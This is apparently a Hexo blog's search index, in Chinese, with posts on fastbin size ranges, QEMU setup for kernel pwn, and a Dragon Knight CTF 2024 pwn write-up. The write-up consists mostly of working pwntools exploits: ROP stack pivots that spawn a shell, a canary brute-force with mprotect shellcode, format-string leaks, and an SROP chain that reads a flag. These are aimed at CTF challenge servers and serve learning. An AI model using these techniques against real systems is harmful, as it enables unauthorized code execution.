<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2023/10/07/hello-world/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>记录每一点收获！</p>
<span id="more"></span>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>嘿嘿嘿</title>
    <url>/2024/06/10/%E5%98%BF%E5%98%BF%E5%98%BF/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="dd52eb2e2846ea185f38e5e7d09f55b33b31b406c716466e997e11b11eabf37a"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>关于fastbin的范围参考</title>
    <url>/2024/06/08/%E5%85%B3%E4%BA%8Efastbin%E7%9A%84%E8%8C%83%E5%9B%B4%E5%8F%82%E8%80%83/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>关于fastbin的范围参考</p>
<span id="more"></span>

<p>来源：<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/21/garden/">和媳妇一起学Pwn 之 Secret Garden | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>
<p>32位：</p>
<table>
<thead>
<tr>
<th align="left">gef fastbin item</th>
<th align="left">chunk size</th>
<th align="left">data interval</th>
<th align="left">fake chunk size</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Fastbins[idx&#x3D;0, size&#x3D;0x8]</td>
<td align="left">0x10</td>
<td align="left">[0x01,0x0c] , [1,12]</td>
<td align="left">[0x10,0x17]</td>
</tr>
<tr>
<td align="left">Fastbins[idx&#x3D;1, size&#x3D;0x10]</td>
<td align="left">0x18</td>
<td align="left">[0x0d,0x14] , [13,20]</td>
<td align="left">[0x18,0x1f]</td>
</tr>
<tr>
<td align="left">Fastbins[idx&#x3D;2, size&#x3D;0x18]</td>
<td align="left">0x20</td>
<td align="left">[0x15,0x1c] , [21,28]</td>
<td align="left">[0x20,0x27]</td>
</tr>
<tr>
<td align="left">Fastbins[idx&#x3D;3, size&#x3D;0x20]</td>
<td align="left">0x28</td>
<td align="left">[0x1d,0x24] , [29,36]</td>
<td align="left">[0x28,0x2f]</td>
</tr>
<tr>
<td align="left">Fastbins[idx&#x3D;4, size&#x3D;0x28]</td>
<td align="left">0x30</td>
<td align="left">[0x25,0x2c] , [37,44]</td>
<td align="left">[0x30,0x37]</td>
</tr>
<tr>
<td align="left">Fastbins[idx&#x3D;5, size&#x3D;0x30]</td>
<td align="left">0x38</td>
<td align="left">[0x2d,0x34] , [45,52]</td>
<td align="left">[0x38,0x3f]</td>
</tr>
<tr>
<td align="left">Fastbins[idx&#x3D;6, size&#x3D;0x38]</td>
<td align="left">0x40</td>
<td align="left">[0x35,0x3c] , [53,60]</td>
<td align="left">[0x40,0x47]</td>
</tr>
</tbody></table>
<p>64 位：</p>
<table>
<thead>
<tr>
<th align="left">gef fastbin item</th>
<th align="left">chunk size</th>
<th align="left">data interval</th>
<th align="left">fake chunk size</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Fastbins[idx&#x3D;0, size&#x3D;0x10]</td>
<td align="left">0x20</td>
<td align="left">[0x01,0x18] , [1,24]</td>
<td align="left">[0x20,0x2f]</td>
</tr>
<tr>
<td align="left">Fastbins[idx&#x3D;1, size&#x3D;0x20]</td>
<td align="left">0x30</td>
<td align="left">[0x19,0x28] , [25,40]</td>
<td align="left">[0x30,0x3f]</td>
</tr>
<tr>
<td align="left">Fastbins[idx&#x3D;2, size&#x3D;0x30]</td>
<td align="left">0x40</td>
<td align="left">[0x29,0x38] , [41,56]</td>
<td align="left">[0x40,0x4f]</td>
</tr>
<tr>
<td align="left">Fastbins[idx&#x3D;3, size&#x3D;0x40]</td>
<td align="left">0x50</td>
<td align="left">[0x39,0x48] , [57,72]</td>
<td align="left">[0x50,0x5f]</td>
</tr>
<tr>
<td align="left">Fastbins[idx&#x3D;4, size&#x3D;0x50]</td>
<td align="left">0x60</td>
<td align="left">[0x49,0x58] , [73,88]</td>
<td align="left">[0x60,0x6f]</td>
</tr>
<tr>
<td align="left">Fastbins[idx&#x3D;5, size&#x3D;0x60]</td>
<td align="left">0x70</td>
<td align="left">[0x59,0x68] , [89,104]</td>
<td align="left">[0x70,0x7f]</td>
</tr>
<tr>
<td align="left">Fastbins[idx&#x3D;6, size&#x3D;0x70]</td>
<td align="left">0x80</td>
<td align="left">[0x69,0x78] , [105,120]</td>
<td align="left">[0x80,0x8f]</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Dragon Knight CTF 2024 pwn wp</title>
    <url>/2024/05/26/Dragon-Knight-CTF-2024-pwn-wp/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Dragon Knight CTF 2024 pwn wp</p>
<span id="more"></span>

<h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>非常经典的栈迁移例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = <span class="string">&#x27;/home/feichai/ctf_file/libc-2.31.so&#x27;</span></span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>, <span class="number">31728</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    puts_plt=elf.plt.puts</span><br><span class="line">    puts_got=elf.got.puts</span><br><span class="line">    </span><br><span class="line">    pop_rdi = <span class="number">0x0000000000401210</span></span><br><span class="line">    leave_ret = <span class="number">0x00000000004011be</span></span><br><span class="line">    bss = <span class="number">0x404040</span> + <span class="number">0x500</span></span><br><span class="line">    pop_rbp = <span class="number">0x000000000040115d</span></span><br><span class="line">    </span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(bss+<span class="number">0x100</span>)+p64(<span class="number">0x40118F</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;pivoting?&#x27;</span>,pd)</span><br><span class="line">    </span><br><span class="line">    pd=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)</span><br><span class="line">    pd+=p64(pop_rbp)+p64(bss+<span class="number">0x500</span>)+p64(<span class="number">0x40118F</span>)</span><br><span class="line">    pd=pd.ljust(<span class="number">0x100</span>,<span class="string">b&quot;\x00&quot;</span>)+p64(bss-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">    sa(<span class="string">b&#x27;pivoting?&#x27;</span>,pd)</span><br><span class="line">    </span><br><span class="line">    leak_libc = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = leak_libc-libc.symbols[<span class="string">b&#x27;puts&#x27;</span>]</span><br><span class="line">    libc_system = libc_base + libc.symbols[<span class="string">b&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    pd=p64(pop_rdi)+p64(bin_sh_addr)+p64(libc_system)</span><br><span class="line">    pd=pd.ljust(<span class="number">0x100</span>,<span class="string">b&quot;\x00&quot;</span>)+p64(bss+<span class="number">0x500</span>-<span class="number">0x100</span>-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">    </span><br><span class="line">    sa(<span class="string">b&#x27;pivoting?&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>爆破canary然后用mprotect提权</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>,<span class="number">30537</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;input:\n&#x27;</span>)</span><br><span class="line">    canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="comment">#sleep(0.1)</span></span><br><span class="line">            s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> + canary + p8(i))</span><br><span class="line">            aa = ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;smashing&#x27;</span> <span class="keyword">in</span> aa:</span><br><span class="line">                ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                canary += p8(i)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">b&quot;canary: &quot;</span> + canary)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    pop_rdi = <span class="number">0x00000000004018c2</span></span><br><span class="line">    pop_rsi = <span class="number">0x000000000040f23e</span></span><br><span class="line">    pop_rdx = <span class="number">0x00000000004017cf</span></span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> + canary + <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">    got_plt = <span class="number">0x4c1000</span></span><br><span class="line">    call_mprotect = <span class="number">0x449774</span></span><br><span class="line">    call_read = <span class="number">0x448920</span></span><br><span class="line"></span><br><span class="line">    pd += p64(pop_rdi) + p64(got_plt)</span><br><span class="line">    pd += p64(pop_rsi) + p64(<span class="number">0x1000</span>) </span><br><span class="line">    pd += p64(pop_rdx) + p64(<span class="number">7</span>)</span><br><span class="line">    pd += p64(call_mprotect)</span><br><span class="line">    </span><br><span class="line">    pd += p64(pop_rdi) + p64(<span class="number">0</span>)</span><br><span class="line">    pd += p64(pop_rsi) + p64(got_plt)</span><br><span class="line">    pd += p64(pop_rdx) + p64(<span class="number">0xff</span>)</span><br><span class="line">    pd += p64(call_read) + p64(got_plt)</span><br><span class="line"></span><br><span class="line">    s(pd)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sc = asm(shellcraft.sh())</span><br><span class="line">    s(sc)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<h3 id="ez-quiz"><a href="#ez-quiz" class="headerlink" title="ez_quiz"></a>ez_quiz</h3><p>解密不太会，用gpt写的，然后就是eval计算，fmt泄露基址，溢出返回backdoor</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/ez_quiz&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = elf.libc.path</span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b *$rebase(0x1E71)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>, <span class="number">30162</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a,drop=<span class="literal">True</span>)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    sla(<span class="string">&quot;Please give me your token:&quot;</span>,<span class="string">&#x27;DRKCTF&#123;P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie&#125;&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;Right!&#x27;</span>)</span><br><span class="line">    ans = <span class="built_in">eval</span>(ru(<span class="string">&#x27;=&#x27;</span>))</span><br><span class="line">    sla(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(ans))</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">&#x27;gift:\n&#x27;</span>,<span class="string">&#x27;%13$p%11$p&#x27;</span>) <span class="comment"># 6</span></span><br><span class="line">    leak_pie = <span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    canary = <span class="built_in">int</span>(r(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">    lg(<span class="string">&#x27;leak_pie&#x27;</span>,leak_pie)</span><br><span class="line">    lg(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line"></span><br><span class="line">    pie_base = leak_pie - <span class="number">0x2042</span></span><br><span class="line">    backdoor = pie_base + <span class="number">0x1426</span></span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">8</span>)+p64(canary)+p64(<span class="number">1</span>)+p64(backdoor)</span><br><span class="line">    sl(pd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<h3 id="srop-seccomp"><a href="#srop-seccomp" class="headerlink" title="srop_seccomp"></a>srop_seccomp</h3><p>题目即考点，基础题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/chall&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>, <span class="number">30374</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    bss = <span class="number">0x404060</span></span><br><span class="line">    mov_rax_0xf = <span class="number">0x0000000000401193</span></span><br><span class="line">    syscall = <span class="number">0x000000000040118a</span></span><br><span class="line">    flag_addr = bss+<span class="number">0x400</span></span><br><span class="line">    leave_ret = <span class="number">0x000000000040136c</span></span><br><span class="line">    ret = <span class="number">0x0000000000401016</span></span><br><span class="line"></span><br><span class="line">    sigopen = SigreturnFrame()</span><br><span class="line">    sigopen.rax = <span class="number">2</span></span><br><span class="line">    sigopen.rdi = flag_addr</span><br><span class="line">    sigopen.rsi = <span class="number">0</span></span><br><span class="line">    sigopen.rdx = <span class="number">0</span></span><br><span class="line">    sigopen.rsp = bss+<span class="number">0x108</span></span><br><span class="line">    sigopen.rbp = bss+<span class="number">0x108</span></span><br><span class="line">    sigopen.rip = syscall</span><br><span class="line">    </span><br><span class="line">    sigread = SigreturnFrame()</span><br><span class="line">    sigread.rax = <span class="number">0</span></span><br><span class="line">    sigread.rdi = <span class="number">3</span></span><br><span class="line">    sigread.rsi = bss + <span class="number">0x700</span></span><br><span class="line">    sigread.rdx = <span class="number">0x100</span></span><br><span class="line">    sigread.rsp = bss+<span class="number">0x218</span></span><br><span class="line">    sigread.rbp = bss+<span class="number">0x218</span></span><br><span class="line">    sigread.rip = syscall</span><br><span class="line">    </span><br><span class="line">    sigwrite = SigreturnFrame()</span><br><span class="line">    sigwrite.rax = <span class="number">1</span></span><br><span class="line">    sigwrite.rdi = <span class="number">1</span></span><br><span class="line">    sigwrite.rsi = bss + <span class="number">0x700</span></span><br><span class="line">    sigwrite.rdx = <span class="number">0x100</span></span><br><span class="line">    <span class="comment">#sigwrite.rsp = bss+0x320</span></span><br><span class="line">    <span class="comment">#sigwrite.rbp = bss+0x320</span></span><br><span class="line">    sigwrite.rip = syscall</span><br><span class="line"></span><br><span class="line">    pd = p64(mov_rax_0xf)+p64(syscall)</span><br><span class="line">    pd += <span class="built_in">bytes</span>(sigopen)</span><br><span class="line"></span><br><span class="line">    pd += p64(<span class="number">0x1</span>)+p64(mov_rax_0xf)+p64(syscall)</span><br><span class="line">    pd += <span class="built_in">bytes</span>(sigread)</span><br><span class="line"></span><br><span class="line">    pd += p64(<span class="number">0x1</span>)+p64(mov_rax_0xf)+p64(syscall)</span><br><span class="line">    pd += <span class="built_in">bytes</span>(sigwrite)</span><br><span class="line"></span><br><span class="line">    pd = pd.ljust(<span class="number">0x400</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">    sa(<span class="string">b&#x27;easyhack&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2a</span>+p64(bss-<span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">    sa(<span class="string">b&#x27;SUID?\n&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>write up</category>
      </categories>
  </entry>
  <entry>
    <title>kernel pwn入门之qemu环境的配置</title>
    <url>/2024/05/23/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>记录一下自己是如何完成qemu环境配置的，以及在配置环境时遇到的问题及解决方案</p>
<span id="more"></span>

<h3 id="环境版本说明"><a href="#环境版本说明" class="headerlink" title="环境版本说明"></a>环境版本说明</h3><p>​	ubuntu20.04</p>
<p>​	VMware虚拟机</p>
<h3 id="qemu安装"><a href="#qemu安装" class="headerlink" title="qemu安装"></a>qemu安装</h3><p>参考文章：<a href="https://arcsin2.cloud/2023/03/03/Ubuntu-22-04-%E5%AE%89%E8%A3%85-QEMU-%E6%B5%81%E7%A8%8B/">Ubuntu 22.04 安装 QEMU 流程 - arcsin2 的个人博客</a></p>
<h4 id="拉取并解压"><a href="#拉取并解压" class="headerlink" title="拉取并解压"></a>拉取并解压</h4><p>我用 wget 拉取时比较慢，直接复制链接下载完再复制到虚拟机里</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://download.qemu.org/qemu-7.2.0.tar.xz</span><br><span class="line">tar -zxvf qemu-7.2.0.tar.xz</span><br><span class="line">cd qemu-7.2.0/</span><br></pre></td></tr></table></figure>

<h4 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ninja-build</span><br><span class="line">sudo apt-get install zlib1g zlib1g-dev</span><br><span class="line">sudo apt-get install libglib2.0-dev</span><br><span class="line">sudo apt-get install libpixman-1-dev</span><br></pre></td></tr></table></figure>

